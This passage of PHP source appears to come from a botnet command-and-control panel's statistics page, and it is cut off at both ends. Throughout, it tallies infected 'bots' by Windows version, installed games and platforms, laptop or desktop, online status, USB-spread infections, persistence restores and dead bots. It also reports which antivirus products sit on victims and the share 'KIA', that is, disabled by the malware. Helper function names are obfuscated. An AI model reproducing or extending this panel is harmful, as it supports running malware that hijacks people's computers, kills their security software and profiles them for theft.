$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SoftwareInstalled & " . BOT_SOFTWARE_VM_SOFTWARE . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_vmsoft) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_vmsoft = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SoftwareInstalled & " . BOT_SOFTWARE_ORIGIN_CLIENT . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_origin) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_origin = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE ClientAttributes & " . BOT_ATTRIBUTE_HAS_STEAM . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_steam) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_steam = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SoftwareInstalled & " . BOT_SOFTWARE_BLIZZARD . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_blizzard) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_blizzard = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SoftwareInstalled & " . BOT_SOFTWARE_LEAGUE_OF_LEGENDS . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_lol) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_lol = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SoftwareInstalled & " . BOT_SOFTWARE_RUNESCAPE . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_runescape) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_runescape = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SoftwareInstalled & " . BOT_SOFTWARE_MINECRAFT . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_minecraft) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_minecraft = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE ClientAttributes & " . BOT_ATTRIBUTE_IS_LAPTOP . " " . $s_extended_query);
if ($flt_query) {
    list($bots_laptop) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $bots_laptop = 0;
}
$bots_desktop = (int) $total_bots - (int) $bots_laptop;
$iTotalNoticeCount = 0;
$all_notices = $sqlDefault->Query("SELECT * FROM " . $sqlDefault->pdbname . ".notices LIMIT 4");
if (!isset($bIsMainPage) && $bIsMainPage == false) {
    $all_notices = $sqlDefault->Query("SELECT * FROM " . $sqlDefault->pdbname . ".notices WHERE notice_options & " . NOTICE_OPTION_DISPLAY_IMPORTANT_PAGES . " LIMIT 4");
} else {
    if (isset($bIsMainPage) && $bIsMainPage == true) {
        $all_notices = $sqlDefault->Query("SELECT * FROM " . $sqlDefault->pdbname . ".notices LIMIT 4");
    }
}
$iTotalNoticeCount = @mysql_num_rows($all_notices);
if ($all_notices && 0 < $iTotalNoticeCount) {
    $iNoticeCount = 0;
    while (($current_row = @mysql_fetch_assoc($all_notices)) && $iNoticeCount < 3) {
        if (strtolower($Session->Get(SESSION_INFO_USERNAME)) === strtolower($current_row["notice_target"]) || strlen($current_row["notice_target"]) == 0) {
            $iType = NOTICE_TYPE_INFO;
            if ((int) $current_row["notice_options"] & NOTICE_OPTION_VIEW_AS_RED) {
                $iType = NOTICE_TYPE_ERROR;
            }
            if (@strlen($current_row["notice_author"]) && @strlen($current_row["notice_content"])) {
                $notice_real_text = "<strong>Notice #" . ($iNoticeCount + 1) . " from <i>" . @htmlspecialchars($current_row["notice_author"]) . "</i>:</strong><br />" . @str_replace("\r\n", "<br />", @htmlspecialchars($current_row["notice_content"]));
                $notice_real_text .= "<br />";
                if ((int) $current_row["notice_options"] & NOTICE_OPTION_ALLOW_REMOVE) {
                    $notice_real_text .= "<br />";
                    $notice_real_text .= "<form style=\"display:inline;\" method=\"post\" action=\"" . $_SERVER["REQUEST_URI"] . "\">";
                    $notice_real_text .= "<input type=\"hidden\" name=\"remove_notice_id\" value=\"" . $current_row["id"] . "\">";
                    $notice_real_text .= "<input type=\"submit\" class=\"btn\" name=\"remove_notice_submit\" value=\"Remove notice\">";
                    $notice_real_text .= "</form>";
                }
                _obfuscated_0D292E0A2F3613041D323B1036055B262D0E2928223232_($iType, $notice_real_text, MOD_TASKS_ALERT_WIDTH);
                $iNoticeCount++;
            }
        }
    }
    if ($iNoticeCount == 3 && 4 <= $iTotalNoticeCount) {
        _obfuscated_0D292E0A2F3613041D323B1036055B262D0E2928223232_($iType, "There appears to be more than 3 notices! Please check the <a href=\"?mod=" . MOD_SETTINGS_ALERTS . "\">notices page</a> for additional notices.", 1600);
    }
}
echo "\r\n";
$szDeadBotOption = "";
if ($bIsPageSetForDeadBotStatistics) {
    $szDeadBotOption = "+ '&dead_stats=" . $_GET["dead_stats"] . "'";
}
echo "<script type=\"text/javascript\">\r\n\tfunction shift_group_focus(){\r\n\t\tdocument.location='";
echo _obfuscated_0D1B343104272A3128121F231B322210111B372F041911_(MOD_STATS, "&view_group=");
echo "' + document.getElementById('group_stats').value ";
echo $szDeadBotOption;
echo "; \r\n\t}\r\n</script>\r\n\r\n\r\n<table class=\"table-bordered\" cellpadding=\"10\" valign=\"top\" align=\"center\" width=\"1740\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t<tr>\r\n\t\t<td>\r\n\t\t\t<strong><font size=\"2\">Group selection - Currently viewing statistics for: ";
echo $current_view_group_text;
echo "</font></strong>\r\n\t\t\t";
if ($bIsPageSetForDeadBotStatistics) {
    echo "<strong>&nbsp;&nbsp;&nbsp;//&nbsp;&nbsp;&nbsp;<font color=\"#339900\">Viewing dead bot statistics. Most statistics below represent the statistics of all (or grouped) dead bots</font></strong>";
}
echo "\t\t</td>\r\n\t</tr>\r\n\t<tr>\r\n\t\t<td valign=\"top\">\r\n\t\t\t<table style=\"border: hidden;\">\r\n\t\t\t\t<tbody>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">\r\n\t\t\t\t\t\t\t<select name=\"stats_group_selection\" id=\"group_stats\" style=\"position: relative; top: -1px; width: 270px; height: 24px; font-size: 10px; face: font-family: Tahoma;\" onchange=\"shift_group_focus();\">\r\n\t\t\t\t\t\t\t\t";
$dwTotalBotsForGroupCode = (int) $bIsPageSetForDeadBotStatistics ? $Num_Dead : $total_bots;
echo "<option value=\"All\">All Groups - " . $dwTotalBotsForGroupCode . "</option>\r\n";
if ($groups) {
    while ($current_row = mysql_fetch_assoc($groups)) {
        if (isset($current_row["GroupName"]) && 0 < strlen($current_row["GroupName"])) {
            $is_sel = "";
            if ($current_row["GroupName"] == $s_current_group) {
                $is_sel = " selected";
            }
            $bots_per_this_group = $sqlBots->Stats_GetTotalBotsByGroupEx($current_row["GroupName"], $ClientStatusValue, $ClientStatusCompOperator);
            echo "<option value=\"" . $current_row["GroupName"] . "\"" . $is_sel . ">" . $current_row["GroupName"] . " - " . $bots_per_this_group . " &nbsp(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($bots_per_this_group, $dwTotalBotsForGroupCode) . "%)</option>";
        }
    }
}
echo "\t\t\t\t\t\t\t</select>\r\n\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t";
$view_dead_bots_link = "";
$view_dead_bots_name = "";
$total_groups_string = "Total groups: " . $total_groups;
$total_groups_string .= " <i>(No unique groups found)</i>";
echo $total_groups_string;
if (isset($_GET["view_group"]) && 0 < strlen($_GET["view_group"])) {
    $view_dead_bots_link = "&view_group=" . $_GET["view_group"];
}
if ($bIsPageSetForDeadBotStatistics) {
    $view_dead_bots_name = "View statistics for existing bots (Normal statistics)";
} else {
    $view_dead_bots_name = "View statistics for dead bots only";
    $view_dead_bots_link .= "&dead_stats=1";
}
$view_dead_bots_link = _obfuscated_0D1B343104272A3128121F231B322210111B372F041911_(MOD_STATS, $view_dead_bots_link);
echo "&nbsp;&nbsp;&nbsp;<strong>|</strong>&nbsp;&nbsp;&nbsp;<a href=\"" . $view_dead_bots_link . "\">" . $view_dead_bots_name . "</a>\r\n";
echo "\r\n\t\t\t\t\t\t\t<br>\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t";
if ($bEnableDeadBotStats == true) {
    echo "<br />";
    $view_general_strong1 = "";
    $view_general_strong2 = "";
    $view_dead_strong1 = "";
    $view_dead_strong2 = "";
    if (isset($_GET["view_dead"])) {
        $view_dead_strong1 = "<strong>";
        $view_dead_strong2 = "</strong>";
    } else {
        $view_general_strong1 = "<strong>";
        $view_general_strong2 = "</strong>";
    }
    echo (string) $view_general_strong1 . "<a href=\"" . _obfuscated_0D1B343104272A3128121F231B322210111B372F041911_(MOD_STATS, "") . "\">View general statistics</a>" . $view_general_strong2 . " <strong>|</strong> " . $view_dead_strong1 . "<a href=\"" . _obfuscated_0D1B343104272A3128121F231B322210111B372F041911_(MOD_STATS, "&view_dead=1") . "\">View dead bot graphs</a>" . $view_dead_strong2;
}
echo "\t\t\t\t\t\t</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</tbody>\r\n\t\t\t</table>\r\n\t\t</td>\r\n\t</tr>\r\n</table>\r\n\r\n<br />\r\n\r\n\r\n";
if (isset($_GET["view_dead"]) && $bEnableDeadBotStats == true) {
    $squery = "SELECT\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE ClientStatus=" . BOT_STATUS_DEAD . " AND (LastCheckIn - FirstCheckIn) = 0) AS 'alive_once',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE ClientStatus=" . BOT_STATUS_DEAD . " AND (LastCheckIn - FirstCheckIn) > 0 AND (LastCheckIn - FirstCheckIn) < 84600) AS 'alive_1day',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE ClientStatus=" . BOT_STATUS_DEAD . " AND (LastCheckIn - FirstCheckIn) > 84600 AND (LastCheckIn - FirstCheckIn) < 169200) AS 'alive_2day',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE ClientStatus=" . BOT_STATUS_DEAD . " AND (LastCheckIn - FirstCheckIn) > 169200 AND (LastCheckIn - FirstCheckIn) < 253800) AS 'alive_3day',\r\n\t\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE ClientStatus=" . BOT_STATUS_DEAD . " AND (LastCheckIn - FirstCheckIn) > 253800 AND (LastCheckIn - FirstCheckIn) < 338400) AS 'alive_4day'";
    $result = $sqlBots->Query($squery);
    $row = NULL;
    if ($result) {
        if ($row = mysql_fetch_assoc($result)) {
            echo "\t\t\t\t<table class=\"table-bordered\" cellpadding=\"10\" align=\"center\" width=\"1740\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t<strong>\r\n\t\t\t\t\t\t\t\t<font size=\"2\">Dead bots by first check in / last check in differences</font>\r\n\t\t\t\t\t\t\t</strong>\r\n\t\t\t\t\t\t</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td valign=\"top\">\r\n\t\t\t\t\t\t\t<table style=\"border: hidden;\">\r\n\t\t\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 160px;\">\r\n\t\t\t\t\t\t\t\t\t\t\tOnly checked in one time:\r\n\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 220px;\">\r\n\t\t\t\t\t\t\t\t\t\t\t";
            echo $row["alive_once"];
            echo "\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 160px;\">\r\n\t\t\t\t\t\t\t\t\t\t\tActive for only 1 day:\r\n\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 220px;\">\r\n\t\t\t\t\t\t\t\t\t\t\t";
            echo $row["alive_1day"];
            echo "\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 160px;\">\r\n\t\t\t\t\t\t\t\t\t\t\tActive for only 2 days:\r\n\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 220px;\">\r\n\t\t\t\t\t\t\t\t\t\t\t";
            echo $row["alive_2day"];
            echo "\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 160px;\">\r\n\t\t\t\t\t\t\t\t\t\t\tActive for only 3 days:\r\n\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 220px;\">\r\n\t\t\t\t\t\t\t\t\t\t\t";
            echo $row["alive_3day"];
            echo "\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 160px;\">\r\n\t\t\t\t\t\t\t\t\t\t\tActive for only 4 days:\r\n\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t\t<td style=\"border: hidden; width: 220px;\">\r\n\t\t\t\t\t\t\t\t\t\t\t";
            echo $row["alive_4day"];
            echo "\t\t\t\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t\t\t</tbody>\r\n\t\t\t\t\t\t\t</table>\r\n\t\t\t\t\t\t</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\r\n\t\t\t\t<br />\r\n\t\t\t\r\n\t\t\t";
        }
        mysql_free_result($result);
    }
}
if (!isset($_GET["view_dead"])) {
    echo "<table cellpadding=\"10\"  align=\"center\" width=\"1740\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t<tr>\r\n\t\t<td width=\"20%\">\r\n\r\n<br />\r\n\r\n<table class=\"table-condensed\" cellpadding=\"5\" valign=\"top\" align=\"left\" width=\"760\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t<thead>\r\n\t\t<tr>\r\n\t\t\t<th width=\"50%\"></th>\r\n\t\t\t<th width=\"50%\"></th>\r\n\t\t</tr>\r\n\t</thead>\r\n\t\t<tbody>\r\n\t<tr>\r\n\t\t<td><strong><font size=\"2\">Operating Systems / AntiVirus usage statistics / Misc</font></strong></td>\r\n\t</tr>\r\n\t<tr>\r\n\t\t<td valign=\"top\">\r\n\t\t\t<table style=\"border: hidden; width:380px;\">\r\n\t\t\t\t<thead>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<th width=\"60%\"></th>\r\n\t\t\t\t\t\t<th width=\"40%\"></th>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</thead>\r\n\t\t\t\t<tbody>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Windows 10</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Windows10 . " / " . $total_bots . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Windows10, $total_bots) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Windows 8.1</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Windows81 . " / " . $total_bots . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Windows81, $total_bots) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Windows 8 (All versions)</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Windows8 . " / " . $total_bots . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Windows8, $total_bots) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Windows 7</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Windows7 . " / " . $total_bots . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Windows7, $total_bots) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Windows Vista</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Windows_Vista . " / " . $total_bots . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Windows_Vista, $total_bots) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Windows XP</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Windows_XP . " / " . $total_bots . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Windows_XP, $total_bots) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Windows Server 2008</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Windows_Server_2008 . " / " . $total_bots . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Windows_Server_2008, $total_bots) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Windows Server 2003</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Windows_Server_2003 . " / " . $total_bots . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Windows_Server_2003, $total_bots) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">&nbsp;</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">&nbsp;</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t";
    if ($bIsPageSetForDeadBotStatistics) {
        echo "<tr>\r\n\t<td style=\"border: hidden;\"><font color=\"#E80000\">Online stats are for non-dead bots only</font></td>\r\n\t<td style=\"border: hidden;\">&nbsp;</td>\r\n</tr>\r\n";
    }
    echo "\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Total bots:</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo $total_bots_per_group_and_clstatus;
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots online:</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Online . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Online, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots online (Past 3h):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Online_3h . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Online_3h, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots online (Past 24h):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Online_24h . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Online_24h, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots online (Past 2 days):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Online_2d . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Online_2d, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots online (Past 3 days):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Online_3d . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Online_3d, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots online (Past 4 days):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Online_4d . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Online_4d, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots online (Past 5 days):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Online_5d . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Online_5d, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots online (Past 7 days):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Online_7d . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Online_7d, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">New bots (Past 24h):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_New_24h . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_New_24h, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">New bots from USB (Past 24h):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_New_USB_24h . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_New_USB_24h, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots offline:</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Offline . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Offline, $total_bots_per_group_and_clstatus, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots dead:</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $Num_Dead . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Dead, $total_bots_edead, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">&nbsp;</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">&nbsp;</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Total bots killed:</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo "<font color=\"#E80000\">" . $total_bots_killed . "</font>";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots running on desktops:</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $bots_desktop . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($bots_desktop, $total_bots, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Bots running on laptops:</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo (string) $bots_laptop . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($bots_laptop, $total_bots, 2) . "%)";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Total persistence file Restores (all bots):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo "<font color=\"#E80000\">" . $persist_restores . "</font>";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">Total restarts due to crashes (all bots):</td>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\">";
    echo "<font color=\"#E80000\">" . $crash_restarts . "</font>";
    echo "</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</tbody>\r\n\t\t\t</table>\r\n\t\t</td>\r\n\t\t<td style=\"border: hidden;\">\r\n\t\t\t<table style=\"border: hidden;\">\r\n\t\t\t\t<thead>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<th width=\"66%\"></th>\r\n\t\t\t\t\t\t<th width=\"34%\"></th>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</thead>\r\n\t\t\t\t<tbody>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t<table style=\"border: hidden; width:420px;\"><thead><tr><th width=\"45%\"></th><th width=\"55%\"></th></tr></thead><tbody>";
    echo "<tr><td style=\"border: hidden;\">No Major AntiVirus</td><td style=\"border: hidden;\">" . $Num_Avs_NoAV . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_NoAV, $total_bots) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Norton</td><td style=\"border: hidden;\">" . $Num_Avs_Norton . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_Norton, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_Norton . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_Norton, $Num_Avs_Norton) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Kaspersky</td><td style=\"border: hidden;\">" . $Num_Avs_Kaspersky . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_Kaspersky, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_Kaspersky . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_Kaspersky, $Num_Avs_Kaspersky) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">AVG</td><td style=\"border: hidden;\">" . $Num_Avs_AVG . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_AVG, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_AVG . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_AVG, $Num_Avs_AVG) . "%)</td></tr>";
